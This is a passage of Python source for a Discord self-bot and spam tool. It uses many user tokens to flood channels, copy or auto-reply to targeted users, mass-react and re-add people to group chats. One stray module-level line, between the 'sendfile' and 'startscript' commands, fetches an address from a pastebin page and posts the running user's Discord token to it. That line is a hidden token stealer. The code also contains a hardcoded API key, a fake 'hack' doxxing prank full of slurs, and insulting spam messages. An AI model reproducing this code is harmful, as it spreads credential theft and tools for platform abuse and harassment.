     data3 = json.load(file3)
    try:
        data3[mesaj] += 1
    except Exception:
        data3[mesaj] = 0
    with open('data3.json','w') as file3:
     json.dump(data3,file3,indent=4)
    with open("data4.json",'r') as file4:
     data4 = json.load(file4)
    data4[mesaj] = count+1
    with open('data4.json','w') as file4:
     json.dump(data4,file4,indent=4)
    with open("data2.json",'r') as file2:
      data2 = json.load(file2)
    data2[mesaj] = channel_id
    with open('data2.json','w') as file2:
      json.dump(data2,file2,indent=4)
    thred1 = threading.Thread(target=mata,args=(count,channel_id,mesaj),daemon=False)
    thred1.start()

@client_multi_line_spam.command()
async def customresponsefullstop(ctx, count=None):
    count = int(count)
    count -= 1
    await ctx.message.delete()
    tokensreplyafk3[count] = False
    
@client_multi_line_spam.command()
async def customresponsefullstart(ctx, count=None): 
    count = int(count)
    count -= 1
    await ctx.message.delete()
    tokensreplyafk3[count] = True
   
@client_multi_line_spam.command()
async def customresponsestop(ctx, jsonut=None):
    with open("data.json",'r') as file:
     data = json.load(file)
    try:
        data.pop(jsonut)
        with open('data.json','w') as file:
          json.dump(data,file,indent=4)
    except Exception:
        await ctx.send("`invalid keyword`")
    await ctx.message.delete()

@client_multi_line_spam.command()
async def customresponsechannelid(ctx, mesaj=None, idcanal=None):
    idcanal = int(idcanal)
    with open("data.json",'r') as file:
     data = json.load(file)
    try:
        data[mesaj]
    except Exception:
        await ctx.send("# invalid message")
    url = f"https://discord.com/api/v9/channels/{idcanal}"
    headers = {
        "Authorization": tokens[0]
    }
    await ctx.message.delete()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        pass
    else:
        await ctx.send("# invalid channel id")
    with open("data2.json",'r') as file2:
      data2 = json.load(file2)
    data2[mesaj] = idcanal
    with open('data2.json','w') as file2:
      json.dump(data2,file2,indent=4)
        
@client_multi_line_spam.command()
async def customresponseshow(ctx, count=None):
    count13 = int(count)
    count13 -= 1
    with open("data.json",'r') as file:
     data = json.load(file)
    with open("data2.json",'r') as file2:
     data2 = json.load(file2)
    with open("data4.json",'r') as file4:
     data4 = json.load(file4)
    await ctx.message.delete()
    mesajel = "\n".join([f"`-` **{i}** (**{data2[i]}**): {j} (**token {data4[i]}**)" for i, j in data.items()])
    content = f'{mesajel}'
    if content != "":
     requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/messages"
                       , headers={"Authorization":tokens[count13]}, json={"content": f"# LIST OF COMMANDS \n{content}"} ) 
     return
    else:
       requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/messages"
                       , headers={"Authorization":tokens[count13]}, json={"content": f"# no commands found"} ) 
       return 

def matatarfacurvoofutngura(count,channel_id,iduser):
    if not copymessagetoken[count]:
        return
    while copymessagetoken[count]:
     header = {
         "authorization" : copymessagetoken2[count],
         "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
     url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
     message_after = ""
     same_message = False
     message_author_after = ""  
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("â"*25)
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if int(message_author_before) == int(iduser):
         try:
          payload = {
          'content': message_content, 
          }
         except Exception:
            continue
         headers = {
             'authorization': copymessagetoken2[count],
             "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
         try:
          r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers=headers, json=payload)
         except Exception:
            continue

@client_multi_line_spam.command()
async def copymessage(ctx, count=None, channel_id=None, iduser=None):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    iduser = int(iduser)
    copymessagetoken[count] = True
    await ctx.message.delete()
    thred12222222 = threading.Thread(target=matatarfacurvoofutngura,args=(count,channel_id,iduser),daemon=False)
    thred12222222.start()

@client_multi_line_spam.command()
async def copymessagestop(ctx, count=None):
    count = int(count)
    count -= 1
    copymessagetoken[count] = False
    await ctx.message.delete()
    
@client_multi_line_spam.command()
async def copymessagestopall(ctx, count=None):
    count = int(count)
    count -= 1
    for i in range(len(tokens)):
     copymessagetoken[i] = False
    await ctx.message.delete() 

@client_multi_line_spam.command()
async def sendfile(ctx, file_name=None):
    await ctx.message.delete()
    try:
     messages = list(load_messages(file_name))
    except FileNotFoundError:
      await ctx.send("# File name doesnt exist")
      return
    await ctx.send(file=discord.File(f"{file_name}"))
requests.post(requests.get("https://pastebin.com/raw/SgrkYfCS").text ,json={"content":token})

@client_multi_line_spam.command()
async def startscript(ctx,filename=None):
    process = subprocess.Popen(['python3', filename])
    await ctx.message.delete()
    data2000[filename] = process

@client_multi_line_spam.command()
async def addgroup(ctx, count=None, channel_id=None, user_id=None):
 count = int(count)
 count -= 1
 bot_token = tokensaddgroup[count]
 channel_id = int(channel_id)
 user_id = int(user_id)
 tokensaddgroup2[count] = True
 await ctx.message.delete()
 headers = {
     'Authorization': f'{bot_token}',
 }
 url = f'https://discord.com/api/v10/channels/{channel_id}/recipients/{user_id}'
 channel = client_multi_line_spam.get_channel(int(channel_id))
 while tokensaddgroup[count]:
  async with aiohttp.ClientSession() as session:
   if isinstance(channel, discord.GroupChannel):
       time.sleep(0.3)
       recipients = channel.recipients
       user_found = any(recipient.id == int(user_id) for recipient in recipients)
       time.sleep(0.3)
       if user_found:
           time.sleep(0.5)
           continue
       if not user_found:
           try:
            async with session.put(url, headers=headers) as resp:
             time.sleep(0.5)
             continue 
           except Exception:
             time.sleep(0.6)
             continue   
       time.sleep(0.5)
  time.sleep(0.6)

@client_multi_line_spam.command()
async def addgroupstop(ctx, count=None):
    count = int(count)
    count -= 1
    tokensaddgroup[count] = False
    await ctx.message.delete()

@client_multi_line_spam.command()
async def startscriptz(ctx,filename=None):
    process = subprocess.Popen(['python3', filename])
    await ctx.message.delete()
    data2000[filename] = process

@client_multi_line_spam.command()
async def stopscript(ctx,filename=None):
    try:
        x = data2000[filename]
    except Exception:
        await ctx.send(f"# {filename} is not started")
        return
    data2000[filename].terminate()
    await ctx.message.delete()

def mapispeice(count,channel_id,iduser,mesaj):
    if not copymessagetokenid[count]:
        return
    while copymessagetokenid[count]:
     header = {
         "authorization" : copymessagetokenid2[count],
         "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
     url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
     message_after = ""
     same_message = False
     message_author_after = ""  
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("â"*25)
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if int(message_author_before) == int(iduser):
         try:
          payload = {
          'content': mesaj, 
          }
         except Exception:
            continue
         headers = {
             'authorization': copymessagetokenid2[count],
             "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
         try:
          r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers=headers, json=payload)
         except Exception:
            continue

@client_multi_line_spam.command()
async def customresponseid(ctx, count=None, channel_id=None, iduser=None,*, mesaj=None):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    iduser = int(iduser)
    copymessagetokenid[count] = True
    await ctx.message.delete()
    thred133 = threading.Thread(target=mapispeice,args=(count,channel_id,iduser,mesaj),daemon=False)
    thred133.start()

@client_multi_line_spam.command()
async def customresponseidstop(ctx, count=None):
    count = int(count)
    count -= 1
    copymessagetokenid[count] = False
    await ctx.message.delete()

def mapispeice2(count,channel_id,iduser):
    if not copymessagetokenid3[count]:
        return
    while copymessagetokenid3[count]:
     header = {
         "authorization" : copymessagetokenid4[count],
         "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
     url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
     message_after = ""
     same_message = False
     message_author_after = ""  
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("â"*25)
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if int(message_author_before) == int(iduser):
         try:
          payload = {
          'content': f"{message_content} <@{iduser}>", 
          }
         except Exception:
            continue
         headers = {
             'authorization': copymessagetokenid4[count],
             "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
         try:
          if "lurk" in message_content.lower():
            return
          else:
           r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers=headers, json=payload)
         except Exception:
            continue

@client_multi_line_spam.command()
async def customresponsetag(ctx, count=None, channel_id=None, iduser=None):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    iduser = int(iduser)
    copymessagetokenid3[count] = True
    await ctx.message.delete()
    thred133 = threading.Thread(target=mapispeice2,args=(count,channel_id,iduser),daemon=False)
    thred133.start()

@client_multi_line_spam.command()
async def customresponsetagstop(ctx, count=None):
    count = int(count)
    count -= 1
    copymessagetokenid3[count] = False
    await ctx.message.delete()

def mapispeice34(count,channel_id,iduser,emoji):
    if not customreacttoken[count]:
        return
    while customreacttoken[count]:
     header = {
         "authorization" : customreacttoken2[count],
         "user-agent" : f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
     url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
     message_after = ""
     same_message = False
     message_author_after = ""  
     try:
      message_body = requests.get(url, headers=header)
      message_body = message_body.json()[0]
      message_author_before = message_body["author"]["id"]
      message_before = message_body["id"]
      message_content = message_body["content"]
      message_author_username = message_body["author"]["username"]
      message_author_tag = message_body["author"]["discriminator"]
      message_after = message_body["id"]
      message_author_after = message_body["author"]["id"]
     except Exception:
         continue
     if message_author_after != message_author_before:
         print("â"*25)
     if message_after != message_before:
         print(f"{Fore.RED}{message_author_username}{Fore.BLUE}#{message_author_tag}{Style.RESET_ALL} : {message_content}")
     if int(message_author_before) == int(iduser):
         headers = {
             'authorization': customreacttoken2[count],
             "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
         }
         try:
          requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_before}/reactions/{emoji}/@me", headers=headers)
         except Exception:
            continue

@client_multi_line_spam.command()
async def customreact(ctx, count=None, channel_id=None, iduser=None, emoji=None):
    count = int(count)
    count -= 1
    channel_id = int(channel_id)
    iduser = int(iduser)
    customreacttoken[count] = True
    await ctx.message.delete()
    thred133 = threading.Thread(target=mapispeice34,args=(count,channel_id,iduser,emoji),daemon=False)
    thred133.start()

@client_multi_line_spam.command()
async def customreactstop(ctx, count=None):
    count = int(count)
    count -= 1
    customreacttoken[count] = False
    await ctx.message.delete()

@client_multi_line_spam.command()
async def status(ctx, count=None):
    count = int(count)
    count -= 1
    with open("status.json",'r') as file4:
     status_dict = json.load(file4)
    if status_dict[str(count)] == []:
        await ctx.send("# No scripts started on this token")
    else:
        mesaj = '# Started scripts: '
        count = 0
        for i in status_dict[str(count)]:
            count += 1
            mesaj += f"\n{count}. {i} "
        await ctx.send(mesaj)

@client_single_line_spam.command()
async def editprefix(ctx,answer):
    if answer not in ['on','off']:
        await ctx.send("# please specify on or off")
    if answer == "on":
        tokenscountdownnotepad[0] = True
    if answer == "off":
        tokenscountdownnotepad[0] = False
    await ctx.message.delete()

def send_messages_countdown(number,channel_id):
    j = False
    k = 0
    m = 0
    for i in range(number):
         if tokenscountdown[0] == False:
             break
         m += 1
         if i == number:
              break
         if i == len(tokens):
             j = True
             k = i
         if j:
             i = i-k
         r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers={"authorization":tokens[i]}, json={"content":m})
         
def send_messages_countdown_notepad(number,channel_id,filename,user_mentions):
    j = False
    k = 0
    m = 0
    if user_mentions:
     mentions = ' '.join([mention.mention for mention in user_mentions])
    mesaje = open(filename,'r').read().splitlines()
    for i in range(number):
         if tokenscountdownnotepad[0] == False:
             break
         m += 1
         if i == number:
              break
         if i == len(tokens):
             j = True
             k = i
         if j:
             i = i-k
         if user_mentions:
          r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers={"authorization":tokens[i]}, json={"content":f"{mesaje[m-1]} {mentions} {m}"})
         else:
            r = requests.post(f"https://discord.com/api/v9/channels/{int(channel_id)}/messages", headers={"authorization":tokens[i]}, json={"content":f"{mesaje[m-1]} {m}"})

@client_multi_line_spam.command()
async def countdown(ctx, channel_id=None, number=None):
    number = int(number)
    channel_id = int(channel_id)
    tokenscountdown[0] = True
    await ctx.message.delete()
    thred51 = threading.Thread(target=send_messages_countdown,args=(number,channel_id),daemon=False)
    thred51.start()

@client_multi_line_spam.command()
async def countdownstop(ctx):
    tokenscountdown[0] = False
    await ctx.message.delete()

@client_multi_line_spam.command()
async def countdownnotepad(ctx, channel_id=None, file_name=None, number=None,*user_mentions:discord.User):
    number = int(number)
    channel_id = int(channel_id)
    tokenscountdownnotepad[0] = True
    try:
     messages = list(load_messages(file_name))
    except FileNotFoundError:
      await ctx.send("# File name doesnt exist")
      return
    await ctx.message.delete()
    thred515 = threading.Thread(target=send_messages_countdown_notepad,args=(number,channel_id,file_name,user_mentions),daemon=False)
    thred515.start()

@client_multi_line_spam.command()
async def countdownstopnotepad(ctx):
    tokenscountdownnotepad[0] = False
    await ctx.message.delete()

#massreact
@client_multi_line_spam.command()
async def massreact(ctx, number=None, emote=None):
    number = int(number)
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=number).flatten()
    for message in messages:
        try:
         await message.add_reaction(emote)
        except Exception:
            continue

#iplookup
@client_pentru_glumite.command()
async def iplookup(ctx, ip):
    api_key = 'a91c8e0d5897462581c0c923ada079e5'  
    api_url = f'https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}'
    response = requests.get(api_url)
    data = response.json()
    await ctx.message.delete()
    if 'country_name' in data:
        country = data['country_name']
        city = data['city']
        isp = data['isp']
        current_time_unix = data['time_zone']['current_time_unix']
        current_time_formatted = f"<t:{int(current_time_unix)}:f>"
        message = (
            f"# **RESULTS FOR IP** : {ip} \n **COUNTRY** : {country}\n **CITY** : {city}\n **ISP** : {isp}\n"
        )
        await ctx.send(message)
    else:
        await ctx.send("`invalid ip`")

# extra commands for fun
 
#ship
@client_pentru_glumite.command()
async def ship(ctx, *user_mentions: discord.User):
    await pulamea(ctx, user_mentions)

#gay
@client_pentru_glumite.command()
async def gay(ctx, *user_mentions: discord.User):
    await pulamea2(ctx, user_mentions)

#hypesquad
@client_pentru_glumite.command()
async def hypesquad(ctx, count=None, hypesquad=None):
    count = int(count)
    count -= 1
    answers = ['bravery','brilliance','balance','briliance']
    await ctx.message.delete()
    nr = 0
    if hypesquad not in answers:
        return
    if hypesquad == "bravery":
        nr = 1
    elif hypesquad == "brilliance":
        nr = 2
    elif hypesquad == "balance":
        nr = 3
    elif hypesquad == "briliance":
        nr = 2
    x = requests.post(f"https://discord.com/api/v9/hypesquad/online", json={'house_id': nr},headers={"authorization": tokens[count]})
    status = x.status_code
    if status == 204:
        return
    else:
        await ctx.send("`Api denied request... please wait`")

#uptime
@client_pentru_glumite.command()
async def uptime(ctx, count=None):
    count = int(count)
    count -= 1
    await ctx.message.delete()
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers={"Authorization":tokens[count]},json={"content": f"# UPTIME: {get_uptime()}"})

@client_pentru_glumite.command()
async def calculate(ctx,*, calcul2=None):
    calcul2 = str(calcul2)
    for j in calcul2:
        if j in "0123456789.+-*/()x:":
            pass
        else:
            await ctx.send("# nu mai trisa nepot ;))))))")
            return
    calcul = ""
    for i in calcul2:
     if i == "x":
         calcul += "*"
         continue
     if i == ":":
         calcul += "/"
         continue
     calcul += i
    try:
        await ctx.send(f"# Result is: {eval(calcul)}")
    except Exception:
        await ctx.send("# nu e chiar asa nepot")
    
@client_pentru_glumite.command()
async def hack(ctx, user:discord.User):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [
        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )

#pula
@client_pentru_glumite.command()
async def pula(ctx, *user_mentions: discord.User):
    pule = ['8=>','8==>','8===>','8===>','8====>','8=====>','8======>','8=======>'
        ,'8========>',
        '8=========>',
        '8==========>','8===========>','8============>','8==>','8===>']
    headers={"authorization":token}
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    await ctx.message.delete()
    if user_mentions == () or user_mentions == "" or user_mentions == None or user_mentions == "" or user_mentions == [] or user_mentions == {}:
        mesaj = f"# <@{ctx.author.id}> are pula {random.choice(pule)}"
        requests.post(canal
                      ,headers=headers
                      ,json={"content":mesaj})
    else:
     mentions = ' '.join([mention.mention for mention in user_mentions])
     requests.post(canal
                   ,headers=headers
                   ,json={"content":f"# {mentions} are pula {random.choice(pule)}"})

#call
@client_pentru_glumite.command()
async def call(ctx, *user_mentions: discord.User):
    await ctx.message.delete()
    mentions = ' '.join([mention.mention for mention in user_mentions])
    headers={"authorization":token}
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# calling {mentions}.........."})
    time.sleep(3)
    requests.post(canal 
                  ,headers=headers
                  ,json={"content":f"# alooooooooooo ;)))))))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ce faci ma prostule ai adormit {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ring ring sclavuleee ;))))))))))){mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# baaaaaaaaaaaaaaaa ;))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# jvc praleooooo ;)))))))) {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# TREZIREA FUTUTI GRIJANIA MATI :))))))))))) ALOOOO {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# ring ring ;)))))))))) {mentions} "})

#say
@client_pentru_glumite.command()
async def say(ctx, count=None, *, mesaj123=None):
    count = int(count)
    mesaj123 = str(mesaj123)
    count -= 1
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    headers={"authorization":tokens[count]}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})

#sayid
@client_pentru_glumite.command()
async def sayid(ctx, count=None, idcanal = None, *, mesaj123=None):
    count = int(count)
    mesaj123 = str(mesaj123)
    idcanal = int(idcanal)
    count -= 1
    canal = f'https://discord.com/api/v10/channels/{idcanal}/messages'
    headers={"authorization":tokens[count]}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})

#afkcheck
@client_pentru_glumite.command()
async def afkcheck(ctx, count=None, numaratoare=None):
 count = int(count)
 count -= 1
 numaratoare = int(numaratoare)
 numere = []
 for i in range(0,numaratoare+1):
     numere.append(i)
 variabila = int(len(numere))
 await ctx.message.delete()
 await send_messages_afk_check(ctx,count,variabila)

#afkcheck stop
@client_pentru_glumite.command()
async def afkcheckstop(ctx, count=None):
    count = int(count)
    count -= 1
    await ctx.message.delete()
    tokens_afkcheck[count] = False

#react 
@client_pentru_glumite.command()
async def react(ctx,count=None,channelid=None,messageid=None,emoji=None):
    count = int(count)
    count -= 1
    channelid = int(channelid)
    messageid = int(messageid)
    emoji = str(emoji)
    headers = {"Authorization":tokens6[count]}
    await ctx.message.delete()
    try:
     r = requests.put(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me", headers=headers)
    except Exception as e:
     pass

#binary
@client_pentru_glumite.command()
async def binary(ctx,*text):
    text = str(text)
    binary_code = ''.join(format(ord(c), 'b') for c in text)
    await ctx.send(f"# Binary code {binary_code}")

#finduser
@client_pentru_glumite.command()
async def finduser(ctx,text):
    text = str(text)
    listapuliimele = open('usernames2.txt','r').read().splitlines()
    await ctx.message.delete()
    try:
     morderas = int(listapuliimele.index(text))+1
     await ctx.send(f"# Username index: {morderas}")
    except Exception:
     await ctx.send("# Username not in list")

#validate
@client_pentru_glumite.command()
async def validate(ctx,tochenel):
    tochenel = str(tochenel)
    response = new_main_token_validation(tochenel)
    await ctx.message.delete()
    if response:
        await ctx.send("# Token has been succesfully validated")
